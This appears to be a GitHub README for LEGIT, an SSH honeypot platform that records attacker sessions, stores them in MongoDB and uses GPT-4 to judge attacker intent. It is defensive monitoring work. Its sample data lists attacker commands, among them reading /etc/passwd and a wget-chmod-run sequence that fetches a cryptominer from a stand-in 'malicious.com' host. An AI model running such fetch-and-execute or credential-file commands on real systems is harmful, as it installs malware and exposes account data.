# LEGIT - SSH Honeypot Monitoring Platform

### **L**ooks **E**xploitable, **G**otcha! **I**t's **T**rapped

> *They think they've found an easy target. Little do they know, every keystroke is being recorded.* 🎭

A sophisticated SSH honeypot monitoring system that lures attackers into a fake environment while capturing and analyzing their every move. LEGIT combines real-time session recording, AI-powered threat analysis, and an intuitive web dashboard to give you unparalleled visibility into SSH-based attacks.

## 🎯 Overview

LEGIT appears to be a vulnerable SSH server waiting to be exploited. In reality, it's a carefully crafted trap that:
- **Records complete SSH sessions** with timing information and full terminal output
- **Captures every command** attackers attempt to run
- **Analyzes behavior patterns** using OpenAI's GPT models
- **Provides real-time monitoring** through a React-based dashboard
- **Stores everything** for post-incident analysis and threat intelligence

Perfect for security researchers, SOC teams, threat hunters, and anyone interested in understanding real-world attack patterns.

## ✨ Key Features

### The Honeypot
- **Authentic SSH environment** that convincingly mimics a real server
- **Session recording** using script/scriptreplay for full playback capability
- **Metadata capture** including source IPs, timestamps, and connection details
- **Automatic logging** of all terminal activity and user commands

### The Intelligence Engine
- **Real-time log parsing** that converts raw terminal logs into structured data
- **MongoDB storage** for scalable data persistence and querying
- **AI-powered analysis** that identifies attacker intentions and behavior patterns
- **Threat classification** based on command sequences and session characteristics

### The Dashboard
- **Session browsing** with sorting, filtering, and search capabilities
- **Detailed session views** showing complete command history and timing
- **AI verdict display** showing threat assessments for each source IP
- **Modern UI** built with React for a responsive, intuitive experience

### Security & Authentication
- **JWT-based authentication** protecting your dashboard from unauthorized access
- **Secure API endpoints** with token verification on all protected routes
- **Environment-based configuration** keeping credentials out of code
- **Session management** with configurable token expiration

## 🏗️ Architecture

```
                    ┌─────────────────────┐
                    │   SSH Honeypot      │
                    │   (Port 2222)       │
                    │                     │
                    │  • Session Recording│
                    │  • Terminal Capture │
                    │  • Metadata Logging │
                    └──────────┬──────────┘
                               │
                               │ Raw logs (.typescript,
                               │ .timing, .meta.json)
                               ▼
                    ┌─────────────────────┐
                    │   SSH Parser        │
                    │   (Python)          │
                    │                     │
                    │  • Log Processing   │
                    │  • Command Extract  │
                    │  • Event Timeline   │
                    └──────────┬──────────┘
                               │
                               │ Structured JSON
                               ▼
                    ┌─────────────────────┐
                    │     MongoDB         │
                    │                     │
                    │  • Sessions         │
                    │  • AI Analyses      │
                    └──────────┬──────────┘
                               │
                               │ API Queries
                               ▼
                    ┌─────────────────────┐
                    │   Node.js Backend   │
                    │   (Express + OpenAI)│
                    │                     │
                    │  • REST API         │
                    │  • AI Analysis      │
                    │  • Authentication   │
                    └──────────┬──────────┘
                               │
                               │ HTTP/JSON
                               ▼
                    ┌─────────────────────┐
                    │   React Frontend    │
                    │   (Port 3000)       │
                    │                     │
                    │  • Session List     │
                    │  • Detail Views     │
                    │  • AI Verdicts      │
                    └─────────────────────┘
```

## 🚀 Quick Start

### Prerequisites
- **Docker & Docker Compose** - For containerized deployment
- **OpenAI API Key** - For AI-powered threat analysis (get one at [platform.openai.com](https://platform.openai.com))

### Installation

**1. Clone the repository**
```bash
git clone https://github.com/yourusername/Legit.git
cd Legit
```

**2. Configure environment variables**

Create a `.env` file in the `backend` directory:
```env
MONGO_URI=mongodb://mongo:27017/ttylogs
OPENAI_API_KEY=sk-your_openai_api_key_here
JWT_SECRET=your_super_secret_jwt_key_min_32_chars
ADMIN_USERNAME=admin
ADMIN_PASSWORD=your_secure_password
```

> 🔒 **Security Note**: Use strong, unique values for `JWT_SECRET` and `ADMIN_PASSWORD`. Never commit the `.env` file to version control.

**3. Launch the platform**
```bash
docker-compose up -d
```

This will start:
- SSH Honeypot (port 2222)
- SSH Parser (background service)
- MongoDB (port 27017)
- Backend API (port 5000)
- Frontend Dashboard (port 3000)

**4. Access the dashboard**

Navigate to `http://localhost:3000` in your browser and log in with your configured credentials.

**5. Test the honeypot** (optional)
```bash
ssh root@localhost -p 2222
# Try any password - it will accept anything!
# Run some commands and watch them appear in the dashboard
```

## 📦 Service Details

| Service | Port | Container | Description |
|---------|------|-----------|-------------|
| Frontend | 3000 | `frontend` | React web dashboard |
| Backend | 5000 | `backend` | Express API server |
| MongoDB | 27017 | `mongo` | Database for sessions & analysis |
| SSH Honeypot | 2222 | `ssh-honeypot` | The trap itself |
| SSH Parser | - | `ssh-parser` | Background log processor |

## 🛠️ Technology Stack

### Honeypot Layer
- **Base Image**: Debian-based container with OpenSSH server
- **Session Recording**: `script` and `scriptreplay` utilities
- **Logging**: Custom shell wrapper for metadata capture

### Data Processing Layer
- **Python 3** with threading for concurrent log processing
- **PyMongo** for MongoDB integration
- **Regex parsing** for command extraction and ANSI cleanup
- **Watch loop** for real-time log detection

### Backend Layer
- **Node.js** with Express framework
- **MongoDB Node Driver** for database operations
- **OpenAI SDK** for GPT-4 integration
- **JWT (jsonwebtoken)** for authentication
- **CORS support** for cross-origin requests

### Frontend Layer
- **React 18** with hooks and modern patterns
- **React Router v6** for navigation
- **Axios** for API communication
- **CSS3** for responsive styling

## 📊 Dashboard Walkthrough

### Sessions List Page
The main view displays all captured SSH sessions with:
- **Source IP addresses** - Where attackers are connecting from
- **Connection timestamps** - When sessions started and ended
- **Command counts** - How many commands were executed
- **AI verdicts** - Threat assessments (when available)
- **Sorting & filtering** - Find specific sessions quickly
- **Search functionality** - Filter by IP or keywords

Click any session to view full details.

### Session Detail Page
Dive deep into individual sessions with:
- **Complete command history** - Every command typed, in order
- **Timing information** - See how long the session lasted
- **Event timeline** - Terminal output with precise timestamps
- **Connection metadata** - Full context about the session
- **AI Analysis button** - Generate threat assessment on demand

### AI Analysis
When you click "Analyze IP", LEGIT:
1. Fetches the last 5 sessions from that IP
2. Sends command summaries to OpenAI's GPT-4
3. Receives an intelligent analysis of attacker intentions
4. Caches the result to avoid redundant API calls
5. Displays the verdict on all sessions from that IP

Example verdicts:
- *"Reconnaissance attempt - scanning for system information and users"*
- *"Automated bot attempting crypto mining installation"*
- *"Credential stuffing with common password patterns"*

## 🔧 Configuration & Customization

### Honeypot Customization

**Change SSH port mapping**:
Edit `docker-compose.yml`:
```yaml
ssh-honeypot:
  ports:
    - "22:22"  # Use real SSH port (requires running as root)
```

**Modify session recording behavior**:
Edit `honeypots/ssh-hp/session_recorder.sh` to customize:
- Welcome messages
- Fake hostnames
- Available commands
- Session timeout behavior

### Parser Configuration

Environment variables for `ssh-parser`:
```yaml
environment:
  - MONGO_URI=mongodb://mongo:27017/ttylogs
  - SCAN_INTERVAL=10  # Seconds between log scans
```

Adjust `SCAN_INTERVAL` based on expected attack volume:
- High traffic: `5-10` seconds
- Low traffic: `30-60` seconds

### Backend Configuration

The backend `.env` file supports:
```env
# Database
MONGO_URI=mongodb://mongo:27017/ttylogs

# OpenAI
OPENAI_API_KEY=sk-...

# Auth
JWT_SECRET=<min-32-chars>
ADMIN_USERNAME=admin
ADMIN_PASSWORD=<strong-password>
```

**CORS Configuration**:
For production, restrict CORS in `backend/server.js`:
```javascript
const corsOptions = {
  origin: 'https://yourdomain.com'
};
app.use(cors(corsOptions));
```

### Frontend Customization

Modify `frontend/src/styles/App.css` to customize:
- Color scheme and branding
- Layout and spacing
- Component styling

## 📝 Data Structure

### SSH Session Document (MongoDB)
```json
{
  "_id": "ObjectId('...')",
  "session_id": "ssh_1234567890_192.168.1.100",
  "source_ip": "192.168.1.100",
  "start_time": "2024-11-24T10:30:00.000Z",
  "end_time": "2024-11-24T10:35:00.000Z",
  "username": "root",
  "commands": [
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.com/cryptominer"
  ],
  "events": [
    {
      "time_offset": 0.5,
      "data": "whoami\r\nroot\r\n"
    },
    {
      "time_offset": 2.3,
      "data": "uname -a\r\nLinux honeypot 5.10.0\r\n"
    }
  ],
  "aiVerdict": "Automated scanning bot attempting to download crypto mining software"
}
```

### AI Analysis Document (MongoDB)
```json
{
  "_id": "ObjectId('...')",
  "ip": "192.168.1.100",
  "verdict": "Automated scanning bot attempting to download crypto mining software",
  "updatedAt": "2024-11-24T10:40:00.000Z"
}
```

## 🔐 Security Best Practices

### Production Deployment Checklist

- [ ] **Change all default credentials** in `.env` file
- [ ] **Use strong JWT secret** (minimum 32 random characters)
- [ ] **Configure CORS properly** (whitelist your frontend domain only)
- [ ] **Enable HTTPS** for frontend and backend (use Let's Encrypt)
- [ ] **Restrict MongoDB access** (bind to localhost or use authentication)
- [ ] **Run on non-privileged ports** (2222 for SSH, not 22)
- [ ] **Isolate honeypot network** (DMZ or separate VLAN)
- [ ] **Never expose management ports** (3000, 5000, 27017) to internet
- [ ] **Monitor disk usage** (logs can grow quickly)
- [ ] **Set up log rotation** for Docker container logs
- [ ] **Regular backups** of MongoDB data
- [ ] **Review OpenAI API usage** to manage costs

### Network Architecture for Production

```
                Internet
                   │
                   │
            ┌──────▼──────┐
            │  Firewall   │
            │             │
            │  Allow 2222 │  ← Only honeypot port exposed
            └──────┬──────┘
                   │
         ┌─────────▼─────────┐
         │  DMZ / Honeypot   │
         │     Network       │
         │                   │
         │  SSH Honeypot     │
         │   (Port 2222)     │
         └─────────┬─────────┘
                   │
         ┌─────────▼─────────┐
         │  Internal Network │
         │                   │
         │  • Parser         │
         │  • MongoDB        │
         │  • Backend        │
         │  • Frontend       │
         │                   │
         │  (NOT accessible  │
         │   from internet)  │
         └───────────────────┘
```

### Access Control

The honeypot itself **should be** exposed to the internet - that's the point!

The dashboard and API **should NOT be** exposed - protect them with:
- VPN access only
- IP whitelist on firewall
- Reverse proxy with authentication
- Network segmentation

## 🐛 Troubleshooting

### Honeypot Issues

**"No sessions being captured"**
```bash
# Check if honeypot is running and accessible
docker-compose ps
docker-compose logs ssh-honeypot

# Verify port is listening
netstat -tulpn | grep 2222

# Test connection
ssh root@localhost -p 2222
```

**"Sessions recorded but not appearing in dashboard"**
```bash
# Check parser logs
docker-compose logs ssh-parser

# Verify MongoDB connection
docker-compose exec mongo mongo ttylogs --eval "db.sessions.count()"

# Check log directories
ls -la ttylogs/ rawlogs/ jsonlogs/
```

### Parser Issues

**"Parser not processing logs"**
```bash
# Check parser container status
docker-compose ps ssh-parser

# View parser logs for errors
docker-compose logs -f ssh-parser

# Verify MongoDB is accessible from parser
docker-compose exec ssh-parser ping mongo

# Check file permissions
ls -la ttylogs/
```

**"Logs piling up in ttylogs directory"**
- Parser may have crashed - check logs
- MongoDB may be full - check disk space
- Increase `SCAN_INTERVAL` if processing can't keep up

### Backend Issues

**"Cannot connect to backend API"**
```bash
# Check backend status
docker-compose logs backend

# Verify environment variables are set
docker-compose exec backend env | grep -E "MONGO|OPENAI|JWT"

# Test MongoDB connection
docker-compose exec backend node -e "const {MongoClient} = require('mongodb'); new MongoClient(process.env.MONGO_URI).connect().then(() => console.log('OK'))"
```

**"AI analysis failing"**
```bash
# Check OpenAI API key is valid
docker-compose logs backend | grep -i openai

# Verify API key format (starts with sk-)
docker-compose exec backend echo $OPENAI_API_KEY

# Test API connection
docker-compose exec backend curl https://api.openai.com/v1/models -H "Authorization: Bearer $OPENAI_API_KEY"
```

### Frontend Issues

**"Dashboard shows empty or won't load"**
- Check browser console for errors (F12)
- Verify backend is accessible: `curl http://localhost:5000/api/sessions`
- Clear browser cache and refresh
- Check CORS configuration in backend

**"Authentication not working"**
```bash
# Verify credentials in backend/.env
cat backend/.env | grep ADMIN

# Check JWT secret is set
docker-compose exec backend echo $JWT_SECRET

# View backend auth logs
docker-compose logs backend | grep -i login
```

## 📈 Monitoring & Maintenance

### View Live Logs
```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f ssh-honeypot
docker-compose logs -f ssh-parser
docker-compose logs -f backend

# Last 100 lines
docker-compose logs --tail=100 ssh-honeypot
```

### Restart Services
```bash
# Restart all
docker-compose restart

# Restart specific service
docker-compose restart ssh-parser
docker-compose restart backend
```

### Backup Data
```bash
# Backup MongoDB data directory
tar -czf legit-backup-$(date +%Y%m%d-%H%M%S).tar.gz mongodata/

# Backup raw logs (optional - can be large)
tar -czf logs-backup-$(date +%Y%m%d-%H%M%S).tar.gz ttylogs/ rawlogs/ jsonlogs/

# Export MongoDB collection
docker-compose exec mongo mongoexport --db ttylogs --collection sessions --out /data/db/sessions-backup.json
```

### Clean Up Old Data
```bash
# Clear processed logs (be careful!)
rm -rf ttylogs/* rawlogs/* jsonlogs/*

# Clear MongoDB data (DESTRUCTIVE - backs up first!)
tar -czf mongo-backup-before-clear.tar.gz mongodata/
rm -rf mongodata/*
docker-compose restart mongo
```

### Monitor Disk Usage
```bash
# Check space used by logs
du -sh ttylogs/ rawlogs/ jsonlogs/ mongodata/

# Monitor in real-time
watch -n 5 'du -sh ttylogs/ rawlogs/ jsonlogs/ mongodata/'
```

## 🎓 Understanding the Data

### Command Extraction

The parser extracts commands using regex patterns matching shell prompts:
- Looks for `#` or `$` prompt indicators
- Captures text following the prompt
- Filters out shell control sequences

### AI Analysis Prompt

When analyzing an IP, LEGIT sends this prompt to GPT-4:
```
You are a security honeypot analyst. Given these SSH session summaries from IP X.X.X.X:
• 2024-11-24T10:30:00Z: whoami, uname -a, cat /etc/passwd
• 2024-11-24T11:15:00Z: wget malicious.com/miner, chmod +x miner, ./miner

Please write a few phrases describing the likely attacker's intention or behavior.
```

The model responds with natural language analysis, which gets stored and displayed alongside sessions.

### Session Timing

The parser reconstructs session timelines using:
- `.typescript` files (raw terminal output)
- `.typescript.timing` files (delay + byte count pairs)
- `.meta.json` files (connection metadata)

This allows perfect replay of attacker sessions.

## 🤝 Contributing

Contributions are welcome! Whether you want to:
- Add new features
- Improve documentation
- Report bugs
- Suggest enhancements

**How to contribute:**

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/amazing-feature`
3. Commit your changes: `git commit -m 'Add amazing feature'`
4. Push to the branch: `git push origin feature/amazing-feature`
5. Open a Pull Request

**Development setup:**
```bash
# Clone your fork
git clone https://github.com/yourusername/Legit.git
cd Legit

# Create feature branch
git checkout -b feature/my-feature

# Make changes, test locally
docker-compose up --build

# Commit and push
git add .
git commit -m "Description of changes"
git push origin feature/my-feature
```

## 📄 License

This project is provided as-is for educational and research purposes. Use responsibly and in compliance with applicable laws and regulations.

## ⚠️ Legal & Ethical Considerations

### Intended Use
This honeypot system is designed for:
- **Security research** - Understanding attack patterns and techniques
- **Threat intelligence** - Collecting data on real-world threats
- **Network defense** - Detecting and analyzing intrusion attempts
- **Educational purposes** - Learning about offensive security tactics

### Important Warnings

⚠️ **Deploy on YOUR OWN infrastructure only** - Never run honeypots on networks you don't own or administer without explicit written permission.

⚠️ **Legal compliance** - Some jurisdictions have laws regarding "attracting" attackers or monitoring network traffic. Consult with legal counsel before deployment.

⚠️ **Attacker interaction** - This system passively records attacker behavior. Do NOT use it to "hack back" or engage attackers beyond observation.

⚠️ **Data handling** - Captured sessions may contain personally identifiable information. Handle data responsibly and in compliance with privacy laws (GDPR, CCPA, etc.).

⚠️ **Network abuse** - If your honeypot gets compromised and used to attack others, YOU may be held responsible. Isolate it properly and monitor outbound traffic.

### Recommendations

✅ **Get written authorization** before deploying in corporate environments

✅ **Notify your ISP** if running from home/cloud to avoid TOS violations

✅ **Monitor honeypot behavior** to ensure it's not being used to attack others

✅ **Document your setup** for incident response and legal protection

✅ **Consult security & legal teams** before production deployment

## 🙏 Acknowledgments

- **OpenAI** for providing the GPT API that powers intelligent threat analysis
- **The security research community** for honeypot best practices and methodologies
- **Open source contributors** for the excellent tools that make this possible
- **All the attackers** who will unknowingly contribute data to threat intelligence databases

## 📞 Support & Community

**Found a bug?** Open an issue on GitHub with:
- Description of the problem
- Steps to reproduce
- Relevant log output
- Your environment details

**Have a question?** Check existing issues or start a discussion.

**Security vulnerability?** Please report privately via email rather than public issues.

## 🎯 Roadmap

Future enhancements under consideration:
- [ ] Additional honeypot protocols (FTP, Telnet, HTTP)
- [ ] Geolocation mapping of attacker IPs
- [ ] Export functionality for threat intelligence feeds
- [ ] Real-time alerting via email/Slack/Discord
- [ ] Enhanced analytics and visualizations
- [ ] Multi-user support with role-based access
- [ ] API webhooks for external integrations
- [ ] Machine learning for automated classification

---

## 🎭 The Philosophy

> "The best defense is a good deception."

LEGIT embraces the philosophy that you can't protect what you don't understand. By providing attackers with a convincing target, we gain invaluable intelligence about:

- **Attack patterns** - What techniques are actually being used in the wild
- **Attacker behavior** - How sophisticated (or unsophisticated) they really are  
- **Threat landscape** - What's trending in the attack community
- **Zero-days** - Occasionally, you might catch something new

Every connection is a learning opportunity. Every command sequence tells a story. Every session adds to our collective knowledge of the threat landscape.

**Deploy LEGIT. Learn from attackers. Stay one step ahead.**

---

**🍯 Happy Honeypotting! May your logs be plentiful and your attackers be predictable.**

*They think it's vulnerable. You know it's a trap. That's what makes it LEGIT.* 😏
